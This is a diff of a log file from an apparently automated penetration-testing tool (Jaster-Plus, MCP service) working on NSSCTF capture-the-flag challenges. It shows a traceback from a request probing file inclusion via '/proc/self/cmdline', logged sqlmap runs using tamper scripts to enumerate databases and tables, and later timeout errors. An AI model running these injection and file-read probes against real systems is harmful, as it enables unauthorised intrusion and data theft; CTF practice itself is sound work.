@@ -1,61 +1,8 @@
-2026-04-12 20:39:26,109 - jaster.mcp.mcp_service - ERROR - HTTP请求发生未预期的错误: http://node1.anna.nssctf.cn:25404?page=/proc/self/cmdline
-Traceback (most recent call last):
-  File "/home/kali/桌面/Jaster-Plus/src/jaster/mcp/mcp_service.py", line 1500, in http_request
-    response = await _httpx_client.request(**request_params)
-               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/kali/桌面/Jaster-Plus/venv/lib/python3.13/site-packages/httpx/_client.py", line 1540, in request
-    return await self.send(request, auth=auth, follow_redirects=follow_redirects)
-           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/kali/桌面/Jaster-Plus/venv/lib/python3.13/site-packages/httpx/_client.py", line 1629, in send
-    response = await self._send_handling_auth(
-               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-    ...<4 lines>...
-    )
-    ^
-  File "/home/kali/桌面/Jaster-Plus/venv/lib/python3.13/site-packages/httpx/_client.py", line 1657, in _send_handling_auth
-    response = await self._send_handling_redirects(
-               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-    ...<3 lines>...
-    )
-    ^
-  File "/home/kali/桌面/Jaster-Plus/venv/lib/python3.13/site-packages/httpx/_client.py", line 1694, in _send_handling_redirects
-    response = await self._send_single_request(request)
-               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/kali/桌面/Jaster-Plus/venv/lib/python3.13/site-packages/httpx/_client.py", line 1730, in _send_single_request
-    response = await transport.handle_async_request(request)
-               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/kali/桌面/Jaster-Plus/venv/lib/python3.13/site-packages/httpx/_transports/default.py", line 394, in handle_async_request
-    resp = await self._pool.handle_async_request(req)
-           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/kali/桌面/Jaster-Plus/venv/lib/python3.13/site-packages/httpcore/_async/connection_pool.py", line 256, in handle_async_request
-    raise exc from None
-  File "/home/kali/桌面/Jaster-Plus/venv/lib/python3.13/site-packages/httpcore/_async/connection_pool.py", line 229, in handle_async_request
-    await self._close_connections(closing)
-  File "/home/kali/桌面/Jaster-Plus/venv/lib/python3.13/site-packages/httpcore/_async/connection_pool.py", line 345, in _close_connections
-    await connection.aclose()
-  File "/home/kali/桌面/Jaster-Plus/venv/lib/python3.13/site-packages/httpcore/_async/connection.py", line 173, in aclose
-    await self._connection.aclose()
-  File "/home/kali/桌面/Jaster-Plus/venv/lib/python3.13/site-packages/httpcore/_async/http11.py", line 258, in aclose
-    await self._network_stream.aclose()
-  File "/home/kali/桌面/Jaster-Plus/venv/lib/python3.13/site-packages/httpcore/_backends/anyio.py", line 53, in aclose
-    await self._stream.aclose()
-  File "/home/kali/桌面/Jaster-Plus/venv/lib/python3.13/site-packages/anyio/_backends/_asyncio.py", line 1344, in aclose
-    self._transport.close()
-    ~~~~~~~~~~~~~~~~~~~~~^^
-  File "/usr/lib/python3.13/asyncio/selector_events.py", line 1216, in close
-    super().close()
-    ~~~~~~~~~~~~~^^
-  File "/usr/lib/python3.13/asyncio/selector_events.py", line 869, in close
-    self._loop.call_soon(self._call_connection_lost, None)
-    ~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/usr/lib/python3.13/asyncio/base_events.py", line 833, in call_soon
-    self._check_closed()
-    ~~~~~~~~~~~~~~~~~~^^
-  File "/usr/lib/python3.13/asyncio/base_events.py", line 556, in _check_closed
-    raise RuntimeError('Event loop is closed')
-RuntimeError: Event loop is closed
-2026-04-12 21:54:23,841 - jaster.mcp.mcp_service - INFO - Executing sqlmap command: sqlmap -u http://example.com?id=1 --batch --random-agent --level 1 --risk 1 --crawl=0
-2026-04-12 22:41:29,298 - jaster.mcp.mcp_service - INFO - Executing sqlmap command: sqlmap -u http://node4.anna.nssctf.cn:28137/view.php?no=1 --batch --random-agent --tamper space2comment,randomcase --level 2 --risk 2 --dbms mysql --batch --threads=5
-2026-04-12 22:42:40,328 - jaster.mcp.mcp_service - INFO - Executing sqlmap command: sqlmap -u http://node4.anna.nssctf.cn:28137/view.php?no=1 --batch --random-agent --tamper space2comment,randomcase --level 2 --risk 2 --dbms mysql --batch --threads=5 --current-db
-2026-04-12 22:43:20,833 - jaster.mcp.mcp_service - INFO - Executing sqlmap command: sqlmap -u http://node4.anna.nssctf.cn:28137/view.php?no=1 --batch --random-agent --tamper space2comment,randomcase --level 2 --risk 2 --dbms mysql --batch --threads=5 --tables -D webcalendar
-2026-04-12 22:46:25,603 - jaster.mcp.mcp_service - INFO - Executing sqlmap command: sqlmap -u http://node4.anna.nssctf.cn:28137/view.php?no=1 --batch --random-agent --tamper space2comment,between --level 2 --risk 2 --dbms mysql --batch --random-agent --threads=5
+2026-04-13 09:58:48,229 - jaster.mcp.mcp_service - ERROR - HTTP连接错误: http://node1.anna.nssctf.cn:23593 - All connection attempts failed
+2026-04-13 10:08:27,775 - jaster.mcp.mcp_service - ERROR - HTTP请求超时: http://node4.anna.nssctf.cn:23593/view.php?no=6 - 
+2026-04-13 10:08:42,869 - jaster.mcp.mcp_service - ERROR - HTTP请求超时: http://node4.anna.nssctf.cn:23593/view.php?no=0 - 
+2026-04-13 10:08:57,947 - jaster.mcp.mcp_service - ERROR - HTTP请求超时: http://node4.anna.nssctf.cn:23593/ - 
+2026-04-13 10:09:13,028 - jaster.mcp.mcp_service - ERROR - HTTP请求超时: http://node4.anna.nssctf.cn:23593/join.ok.php - 
+2026-04-13 10:15:15,162 - jaster.mcp.mcp_service - ERROR - HTTP请求超时: http://node4.anna.nssctf.cn:23593/view.php?no=18 - 
+2026-04-13 10:15:35,242 - jaster.mcp.mcp_service - ERROR - HTTP请求超时: http://node4.anna.nssctf.cn:23593/view.php?no=19 - 
+2026-04-13 10:15:55,328 - jaster.mcp.mcp_service - ERROR - HTTP请求超时: http://node4.anna.nssctf.cn:23593/view.php?no=14 - 
